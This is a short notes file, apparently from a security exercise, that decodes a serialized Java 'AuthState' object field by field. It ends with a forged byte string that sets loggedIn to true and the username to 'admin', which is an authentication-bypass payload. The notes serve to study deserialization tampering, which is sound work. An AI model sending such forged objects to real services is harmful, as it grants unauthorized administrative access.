@@ -1,0 +1,41 @@
+https://nytrosecurity.com/2018/05/30/understanding-java-deserialization/
+
+
+# TODO - The rest of this file pertains to a specific example and should become generalized
+
+Server's AuthState object:
+
+magic nuber:        ac ed
+protocol version:   00 05
+TC_OBJECT:          73
+TC_CLASSESC:        72
+class name len:     00 09
+class name:         41 75 74 68 53 74 61 74 65 (AuthState)
+serial uid:         00 00 00 00 07 57 d9 c6
+SC_SERIALIZABLE:    02
+variable count:     00 02
+
+type code:          5a (boolean primitive?)
+variable name len:  00 08
+variable name:      6c 6f 67 67 65 64 49 6e (loggedIn)
+
+type code:          4c (class)
+variable name len:  00 08
+variable name:      75 73 65 72 6e 61 6d 65 (username)
+value?:             74 (TC_STRING)
+class name len:     00 12
+class name:         4c 6a 61 76 61 2f 6c 61 6e 67 2f 53 74 72 69 6e 67 3b (Ljava/lang/String;)
+
+
+TC_ENDBLOCKDATA:    78
+NULL REF (end cls): 70
+
+value (loggedIn):   00
+
+value (username):   74 (TC_STRING)
+string length:      00 05
+string data:        47 75 65 73 74 (Guest)
+
+
+
+\xac\xed\x00\x05\x77\x04\x00\x00\x00\x02\x73\x72\x00\x09\x41\x75\x74\x68\x53\x74\x61\x74\x65\x00\x00\x00\x00\x07\x57\xd9\xc6\x02\x00\x02\x5a\x00\x08\x6c\x6f\x67\x67\x65\x64\x49\x6e\x4c\x00\x08\x75\x73\x65\x72\x6e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78\x70\x01\x74\x00\x05admin
